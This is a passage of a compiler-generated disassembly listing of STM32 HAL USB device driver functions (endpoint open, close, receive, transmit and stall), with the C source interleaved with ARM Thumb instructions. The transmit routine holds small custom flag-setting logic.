    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 8001fc4:	687b      	ldr	r3, [r7, #4]
 8001fc6:	681b      	ldr	r3, [r3, #0]
 8001fc8:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001fcc:	b29a      	uxth	r2, r3
 8001fce:	687b      	ldr	r3, [r7, #4]
 8001fd0:	681b      	ldr	r3, [r3, #0]
 8001fd2:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 8001fd6:	b292      	uxth	r2, r2
 8001fd8:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 8001fdc:	6878      	ldr	r0, [r7, #4]
 8001fde:	f00a fc54 	bl	800c88a <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8001fe2:	e011      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 8001fe4:	68fb      	ldr	r3, [r7, #12]
 8001fe6:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8001fea:	2b00      	cmp	r3, #0
 8001fec:	d00c      	beq.n	8002008 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 8001fee:	687b      	ldr	r3, [r7, #4]
 8001ff0:	681b      	ldr	r3, [r3, #0]
 8001ff2:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ff6:	b29a      	uxth	r2, r3
 8001ff8:	687b      	ldr	r3, [r7, #4]
 8001ffa:	681b      	ldr	r3, [r3, #0]
 8001ffc:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8002000:	b292      	uxth	r2, r2
 8002002:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002006:	bf00      	nop
  }
}
 8002008:	3710      	adds	r7, #16
 800200a:	46bd      	mov	sp, r7
 800200c:	bd80      	pop	{r7, pc}

0800200e <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 800200e:	b580      	push	{r7, lr}
 8002010:	b082      	sub	sp, #8
 8002012:	af00      	add	r7, sp, #0
 8002014:	6078      	str	r0, [r7, #4]
 8002016:	460b      	mov	r3, r1
 8002018:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 800201a:	687b      	ldr	r3, [r7, #4]
 800201c:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002020:	2b01      	cmp	r3, #1
 8002022:	d101      	bne.n	8002028 <HAL_PCD_SetAddress+0x1a>
 8002024:	2302      	movs	r3, #2
 8002026:	e013      	b.n	8002050 <HAL_PCD_SetAddress+0x42>
 8002028:	687b      	ldr	r3, [r7, #4]
 800202a:	2201      	movs	r2, #1
 800202c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 8002030:	687b      	ldr	r3, [r7, #4]
 8002032:	78fa      	ldrb	r2, [r7, #3]
 8002034:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 8002038:	687b      	ldr	r3, [r7, #4]
 800203a:	681b      	ldr	r3, [r3, #0]
 800203c:	78fa      	ldrb	r2, [r7, #3]
 800203e:	4611      	mov	r1, r2
 8002040:	4618      	mov	r0, r3
 8002042:	f006 f94a 	bl	80082da <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 8002046:	687b      	ldr	r3, [r7, #4]
 8002048:	2200      	movs	r2, #0
 800204a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800204e:	2300      	movs	r3, #0
}
 8002050:	4618      	mov	r0, r3
 8002052:	3708      	adds	r7, #8
 8002054:	46bd      	mov	sp, r7
 8002056:	bd80      	pop	{r7, pc}

08002058 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 8002058:	b580      	push	{r7, lr}
 800205a:	b084      	sub	sp, #16
 800205c:	af00      	add	r7, sp, #0
 800205e:	6078      	str	r0, [r7, #4]
 8002060:	4608      	mov	r0, r1
 8002062:	4611      	mov	r1, r2
 8002064:	461a      	mov	r2, r3
 8002066:	4603      	mov	r3, r0
 8002068:	70fb      	strb	r3, [r7, #3]
 800206a:	460b      	mov	r3, r1
 800206c:	803b      	strh	r3, [r7, #0]
 800206e:	4613      	mov	r3, r2
 8002070:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 8002072:	2300      	movs	r3, #0
 8002074:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002076:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800207a:	2b00      	cmp	r3, #0
 800207c:	da0e      	bge.n	800209c <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800207e:	78fb      	ldrb	r3, [r7, #3]
 8002080:	f003 0307 	and.w	r3, r3, #7
 8002084:	1c5a      	adds	r2, r3, #1
 8002086:	4613      	mov	r3, r2
 8002088:	009b      	lsls	r3, r3, #2
 800208a:	4413      	add	r3, r2
 800208c:	00db      	lsls	r3, r3, #3
 800208e:	687a      	ldr	r2, [r7, #4]
 8002090:	4413      	add	r3, r2
 8002092:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002094:	68fb      	ldr	r3, [r7, #12]
 8002096:	2201      	movs	r2, #1
 8002098:	705a      	strb	r2, [r3, #1]
 800209a:	e00e      	b.n	80020ba <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800209c:	78fb      	ldrb	r3, [r7, #3]
 800209e:	f003 0207 	and.w	r2, r3, #7
 80020a2:	4613      	mov	r3, r2
 80020a4:	009b      	lsls	r3, r3, #2
 80020a6:	4413      	add	r3, r2
 80020a8:	00db      	lsls	r3, r3, #3
 80020aa:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80020ae:	687a      	ldr	r2, [r7, #4]
 80020b0:	4413      	add	r3, r2
 80020b2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80020b4:	68fb      	ldr	r3, [r7, #12]
 80020b6:	2200      	movs	r2, #0
 80020b8:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 80020ba:	78fb      	ldrb	r3, [r7, #3]
 80020bc:	f003 0307 	and.w	r3, r3, #7
 80020c0:	b2da      	uxtb	r2, r3
 80020c2:	68fb      	ldr	r3, [r7, #12]
 80020c4:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 80020c6:	883a      	ldrh	r2, [r7, #0]
 80020c8:	68fb      	ldr	r3, [r7, #12]
 80020ca:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 80020cc:	68fb      	ldr	r3, [r7, #12]
 80020ce:	78ba      	ldrb	r2, [r7, #2]
 80020d0:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 80020d2:	78bb      	ldrb	r3, [r7, #2]
 80020d4:	2b02      	cmp	r3, #2
 80020d6:	d102      	bne.n	80020de <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 80020d8:	68fb      	ldr	r3, [r7, #12]
 80020da:	2200      	movs	r2, #0
 80020dc:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 80020de:	687b      	ldr	r3, [r7, #4]
 80020e0:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80020e4:	2b01      	cmp	r3, #1
 80020e6:	d101      	bne.n	80020ec <HAL_PCD_EP_Open+0x94>
 80020e8:	2302      	movs	r3, #2
 80020ea:	e00e      	b.n	800210a <HAL_PCD_EP_Open+0xb2>
 80020ec:	687b      	ldr	r3, [r7, #4]
 80020ee:	2201      	movs	r2, #1
 80020f0:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 80020f4:	687b      	ldr	r3, [r7, #4]
 80020f6:	681b      	ldr	r3, [r3, #0]
 80020f8:	68f9      	ldr	r1, [r7, #12]
 80020fa:	4618      	mov	r0, r3
 80020fc:	f003 fe8c 	bl	8005e18 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002100:	687b      	ldr	r3, [r7, #4]
 8002102:	2200      	movs	r2, #0
 8002104:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 8002108:	7afb      	ldrb	r3, [r7, #11]
}
 800210a:	4618      	mov	r0, r3
 800210c:	3710      	adds	r7, #16
 800210e:	46bd      	mov	sp, r7
 8002110:	bd80      	pop	{r7, pc}

08002112 <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002112:	b580      	push	{r7, lr}
 8002114:	b084      	sub	sp, #16
 8002116:	af00      	add	r7, sp, #0
 8002118:	6078      	str	r0, [r7, #4]
 800211a:	460b      	mov	r3, r1
 800211c:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 800211e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002122:	2b00      	cmp	r3, #0
 8002124:	da0e      	bge.n	8002144 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002126:	78fb      	ldrb	r3, [r7, #3]
 8002128:	f003 0307 	and.w	r3, r3, #7
 800212c:	1c5a      	adds	r2, r3, #1
 800212e:	4613      	mov	r3, r2
 8002130:	009b      	lsls	r3, r3, #2
 8002132:	4413      	add	r3, r2
 8002134:	00db      	lsls	r3, r3, #3
 8002136:	687a      	ldr	r2, [r7, #4]
 8002138:	4413      	add	r3, r2
 800213a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 800213c:	68fb      	ldr	r3, [r7, #12]
 800213e:	2201      	movs	r2, #1
 8002140:	705a      	strb	r2, [r3, #1]
 8002142:	e00e      	b.n	8002162 <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002144:	78fb      	ldrb	r3, [r7, #3]
 8002146:	f003 0207 	and.w	r2, r3, #7
 800214a:	4613      	mov	r3, r2
 800214c:	009b      	lsls	r3, r3, #2
 800214e:	4413      	add	r3, r2
 8002150:	00db      	lsls	r3, r3, #3
 8002152:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002156:	687a      	ldr	r2, [r7, #4]
 8002158:	4413      	add	r3, r2
 800215a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800215c:	68fb      	ldr	r3, [r7, #12]
 800215e:	2200      	movs	r2, #0
 8002160:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 8002162:	78fb      	ldrb	r3, [r7, #3]
 8002164:	f003 0307 	and.w	r3, r3, #7
 8002168:	b2da      	uxtb	r2, r3
 800216a:	68fb      	ldr	r3, [r7, #12]
 800216c:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800216e:	687b      	ldr	r3, [r7, #4]
 8002170:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002174:	2b01      	cmp	r3, #1
 8002176:	d101      	bne.n	800217c <HAL_PCD_EP_Close+0x6a>
 8002178:	2302      	movs	r3, #2
 800217a:	e00e      	b.n	800219a <HAL_PCD_EP_Close+0x88>
 800217c:	687b      	ldr	r3, [r7, #4]
 800217e:	2201      	movs	r2, #1
 8002180:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 8002184:	687b      	ldr	r3, [r7, #4]
 8002186:	681b      	ldr	r3, [r3, #0]
 8002188:	68f9      	ldr	r1, [r7, #12]
 800218a:	4618      	mov	r0, r3
 800218c:	f004 fa08 	bl	80065a0 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002190:	687b      	ldr	r3, [r7, #4]
 8002192:	2200      	movs	r2, #0
 8002194:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 8002198:	2300      	movs	r3, #0
}
 800219a:	4618      	mov	r0, r3
 800219c:	3710      	adds	r7, #16
 800219e:	46bd      	mov	sp, r7
 80021a0:	bd80      	pop	{r7, pc}

080021a2 <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80021a2:	b580      	push	{r7, lr}
 80021a4:	b086      	sub	sp, #24
 80021a6:	af00      	add	r7, sp, #0
 80021a8:	60f8      	str	r0, [r7, #12]
 80021aa:	607a      	str	r2, [r7, #4]
 80021ac:	603b      	str	r3, [r7, #0]
 80021ae:	460b      	mov	r3, r1
 80021b0:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80021b2:	7afb      	ldrb	r3, [r7, #11]
 80021b4:	f003 0207 	and.w	r2, r3, #7
 80021b8:	4613      	mov	r3, r2
 80021ba:	009b      	lsls	r3, r3, #2
 80021bc:	4413      	add	r3, r2
 80021be:	00db      	lsls	r3, r3, #3
 80021c0:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80021c4:	68fa      	ldr	r2, [r7, #12]
 80021c6:	4413      	add	r3, r2
 80021c8:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80021ca:	697b      	ldr	r3, [r7, #20]
 80021cc:	687a      	ldr	r2, [r7, #4]
 80021ce:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80021d0:	697b      	ldr	r3, [r7, #20]
 80021d2:	683a      	ldr	r2, [r7, #0]
 80021d4:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 80021d6:	697b      	ldr	r3, [r7, #20]
 80021d8:	2200      	movs	r2, #0
 80021da:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 80021dc:	697b      	ldr	r3, [r7, #20]
 80021de:	2200      	movs	r2, #0
 80021e0:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 80021e2:	7afb      	ldrb	r3, [r7, #11]
 80021e4:	f003 0307 	and.w	r3, r3, #7
 80021e8:	b2da      	uxtb	r2, r3
 80021ea:	697b      	ldr	r3, [r7, #20]
 80021ec:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 80021ee:	68fb      	ldr	r3, [r7, #12]
 80021f0:	681b      	ldr	r3, [r3, #0]
 80021f2:	6979      	ldr	r1, [r7, #20]
 80021f4:	4618      	mov	r0, r3
 80021f6:	f004 fbc0 	bl	800697a <USB_EPStartXfer>

  return HAL_OK;
 80021fa:	2300      	movs	r3, #0
}
 80021fc:	4618      	mov	r0, r3
 80021fe:	3718      	adds	r7, #24
 8002200:	46bd      	mov	sp, r7
 8002202:	bd80      	pop	{r7, pc}

08002204 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 8002204:	b480      	push	{r7}
 8002206:	b083      	sub	sp, #12
 8002208:	af00      	add	r7, sp, #0
 800220a:	6078      	str	r0, [r7, #4]
 800220c:	460b      	mov	r3, r1
 800220e:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 8002210:	78fb      	ldrb	r3, [r7, #3]
 8002212:	f003 0207 	and.w	r2, r3, #7
 8002216:	6879      	ldr	r1, [r7, #4]
 8002218:	4613      	mov	r3, r2
 800221a:	009b      	lsls	r3, r3, #2
 800221c:	4413      	add	r3, r2
 800221e:	00db      	lsls	r3, r3, #3
 8002220:	440b      	add	r3, r1
 8002222:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 8002226:	681b      	ldr	r3, [r3, #0]
}
 8002228:	4618      	mov	r0, r3
 800222a:	370c      	adds	r7, #12
 800222c:	46bd      	mov	sp, r7
 800222e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002232:	4770      	bx	lr

08002234 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002234:	b580      	push	{r7, lr}
 8002236:	b086      	sub	sp, #24
 8002238:	af00      	add	r7, sp, #0
 800223a:	60f8      	str	r0, [r7, #12]
 800223c:	607a      	str	r2, [r7, #4]
 800223e:	603b      	str	r3, [r7, #0]
 8002240:	460b      	mov	r3, r1
 8002242:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002244:	7afb      	ldrb	r3, [r7, #11]
 8002246:	f003 0307 	and.w	r3, r3, #7
 800224a:	1c5a      	adds	r2, r3, #1
 800224c:	4613      	mov	r3, r2
 800224e:	009b      	lsls	r3, r3, #2
 8002250:	4413      	add	r3, r2
 8002252:	00db      	lsls	r3, r3, #3
 8002254:	68fa      	ldr	r2, [r7, #12]
 8002256:	4413      	add	r3, r2
 8002258:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800225a:	697b      	ldr	r3, [r7, #20]
 800225c:	687a      	ldr	r2, [r7, #4]
 800225e:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002260:	697b      	ldr	r3, [r7, #20]
 8002262:	683a      	ldr	r2, [r7, #0]
 8002264:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 8002266:	697b      	ldr	r3, [r7, #20]
 8002268:	2201      	movs	r2, #1
 800226a:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 800226e:	697b      	ldr	r3, [r7, #20]
 8002270:	683a      	ldr	r2, [r7, #0]
 8002272:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 8002274:	697b      	ldr	r3, [r7, #20]
 8002276:	2200      	movs	r2, #0
 8002278:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 800227a:	697b      	ldr	r3, [r7, #20]
 800227c:	2201      	movs	r2, #1
 800227e:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002280:	7afb      	ldrb	r3, [r7, #11]
 8002282:	f003 0307 	and.w	r3, r3, #7
 8002286:	b2da      	uxtb	r2, r3
 8002288:	697b      	ldr	r3, [r7, #20]
 800228a:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 800228c:	4b0e      	ldr	r3, [pc, #56]	; (80022c8 <HAL_PCD_EP_Transmit+0x94>)
 800228e:	781b      	ldrb	r3, [r3, #0]
 8002290:	f003 0302 	and.w	r3, r3, #2
 8002294:	2b00      	cmp	r3, #0
 8002296:	d102      	bne.n	800229e <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 8002298:	4b0c      	ldr	r3, [pc, #48]	; (80022cc <HAL_PCD_EP_Transmit+0x98>)
 800229a:	2201      	movs	r2, #1
 800229c:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800229e:	68fb      	ldr	r3, [r7, #12]
 80022a0:	681b      	ldr	r3, [r3, #0]
 80022a2:	6979      	ldr	r1, [r7, #20]
 80022a4:	4618      	mov	r0, r3
 80022a6:	f004 fb68 	bl	800697a <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 80022aa:	4b07      	ldr	r3, [pc, #28]	; (80022c8 <HAL_PCD_EP_Transmit+0x94>)
 80022ac:	781b      	ldrb	r3, [r3, #0]
 80022ae:	f003 0302 	and.w	r3, r3, #2
 80022b2:	2b00      	cmp	r3, #0
 80022b4:	d102      	bne.n	80022bc <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 80022b6:	4b06      	ldr	r3, [pc, #24]	; (80022d0 <HAL_PCD_EP_Transmit+0x9c>)
 80022b8:	2201      	movs	r2, #1
 80022ba:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 80022bc:	2300      	movs	r3, #0
}
 80022be:	4618      	mov	r0, r3
 80022c0:	3718      	adds	r7, #24
 80022c2:	46bd      	mov	sp, r7
 80022c4:	bd80      	pop	{r7, pc}
 80022c6:	bf00      	nop
 80022c8:	2000026c 	.word	0x2000026c
 80022cc:	20000270 	.word	0x20000270
 80022d0:	2000027c 	.word	0x2000027c

080022d4 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80022d4:	b580      	push	{r7, lr}
 80022d6:	b084      	sub	sp, #16
 80022d8:	af00      	add	r7, sp, #0
 80022da:	6078      	str	r0, [r7, #4]
 80022dc:	460b      	mov	r3, r1
 80022de:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 80022e0:	78fb      	ldrb	r3, [r7, #3]
 80022e2:	f003 0207 	and.w	r2, r3, #7
 80022e6:	687b      	ldr	r3, [r7, #4]
 80022e8:	685b      	ldr	r3, [r3, #4]
 80022ea:	429a      	cmp	r2, r3
 80022ec:	d901      	bls.n	80022f2 <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 80022ee:	2301      	movs	r3, #1
 80022f0:	e04c      	b.n	800238c <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80022f2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80022f6:	2b00      	cmp	r3, #0
 80022f8:	da0e      	bge.n	8002318 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80022fa:	78fb      	ldrb	r3, [r7, #3]
 80022fc:	f003 0307 	and.w	r3, r3, #7
 8002300:	1c5a      	adds	r2, r3, #1
 8002302:	4613      	mov	r3, r2
 8002304:	009b      	lsls	r3, r3, #2
 8002306:	4413      	add	r3, r2
 8002308:	00db      	lsls	r3, r3, #3
 800230a:	687a      	ldr	r2, [r7, #4]
 800230c:	4413      	add	r3, r2
 800230e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002310:	68fb      	ldr	r3, [r7, #12]
 8002312:	2201      	movs	r2, #1
 8002314:	705a      	strb	r2, [r3, #1]
 8002316:	e00c      	b.n	8002332 <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8002318:	78fa      	ldrb	r2, [r7, #3]
 800231a:	4613      	mov	r3, r2
 800231c:	009b      	lsls	r3, r3, #2
 800231e:	4413      	add	r3, r2
 8002320:	00db      	lsls	r3, r3, #3
 8002322:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002326:	687a      	ldr	r2, [r7, #4]
 8002328:	4413      	add	r3, r2
 800232a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800232c:	68fb      	ldr	r3, [r7, #12]
 800232e:	2200      	movs	r2, #0
 8002330:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 8002332:	68fb      	ldr	r3, [r7, #12]
 8002334:	2201      	movs	r2, #1
 8002336:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002338:	78fb      	ldrb	r3, [r7, #3]
 800233a:	f003 0307 	and.w	r3, r3, #7
 800233e:	b2da      	uxtb	r2, r3
 8002340:	68fb      	ldr	r3, [r7, #12]
 8002342:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002344:	687b      	ldr	r3, [r7, #4]
 8002346:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800234a:	2b01      	cmp	r3, #1
 800234c:	d101      	bne.n	8002352 <HAL_PCD_EP_SetStall+0x7e>
 800234e:	2302      	movs	r3, #2
 8002350:	e01c      	b.n	800238c <HAL_PCD_EP_SetStall+0xb8>
 8002352:	687b      	ldr	r3, [r7, #4]
 8002354:	2201      	movs	r2, #1
 8002356:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 800235a:	687b      	ldr	r3, [r7, #4]
 800235c:	681b      	ldr	r3, [r3, #0]
 800235e:	68f9      	ldr	r1, [r7, #12]
 8002360:	4618      	mov	r0, r3
 8002362:	f005 febb 	bl	80080dc <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 8002366:	78fb      	ldrb	r3, [r7, #3]
 8002368:	f003 0307 	and.w	r3, r3, #7
 800236c:	2b00      	cmp	r3, #0
 800236e:	d108      	bne.n	8002382 <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 8002370:	687b      	ldr	r3, [r7, #4]
 8002372:	681a      	ldr	r2, [r3, #0]
 8002374:	687b      	ldr	r3, [r7, #4]
 8002376:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800237a:	4619      	mov	r1, r3
 800237c:	4610      	mov	r0, r2
 800237e:	f005 fffc 	bl	800837a <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 8002382:	687b      	ldr	r3, [r7, #4]
 8002384:	2200      	movs	r2, #0
 8002386:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800238a:	2300      	movs	r3, #0
}
 800238c:	4618      	mov	r0, r3
 800238e:	3710      	adds	r7, #16
 8002390:	46bd      	mov	sp, r7
 8002392:	bd80      	pop	{r7, pc}

08002394 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002394:	b580      	push	{r7, lr}
 8002396:	b084      	sub	sp, #16
 8002398:	af00      	add	r7, sp, #0
 800239a:	6078      	str	r0, [r7, #4]
 800239c:	460b      	mov	r3, r1
 800239e:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 80023a0:	78fb      	ldrb	r3, [r7, #3]
 80023a2:	f003 020f 	and.w	r2, r3, #15
 80023a6:	687b      	ldr	r3, [r7, #4]
 80023a8:	685b      	ldr	r3, [r3, #4]
 80023aa:	429a      	cmp	r2, r3
 80023ac:	d901      	bls.n	80023b2 <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 80023ae:	2301      	movs	r3, #1
 80023b0:	e040      	b.n	8002434 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80023b2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80023b6:	2b00      	cmp	r3, #0
 80023b8:	da0e      	bge.n	80023d8 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80023ba:	78fb      	ldrb	r3, [r7, #3]
 80023bc:	f003 0307 	and.w	r3, r3, #7
 80023c0:	1c5a      	adds	r2, r3, #1
 80023c2:	4613      	mov	r3, r2
 80023c4:	009b      	lsls	r3, r3, #2
 80023c6:	4413      	add	r3, r2
 80023c8:	00db      	lsls	r3, r3, #3
 80023ca:	687a      	ldr	r2, [r7, #4]
 80023cc:	4413      	add	r3, r2
 80023ce:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80023d0:	68fb      	ldr	r3, [r7, #12]
 80023d2:	2201      	movs	r2, #1
 80023d4:	705a      	strb	r2, [r3, #1]
 80023d6:	e00e      	b.n	80023f6 <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80023d8:	78fb      	ldrb	r3, [r7, #3]
 80023da:	f003 0207 	and.w	r2, r3, #7
 80023de:	4613      	mov	r3, r2
 80023e0:	009b      	lsls	r3, r3, #2
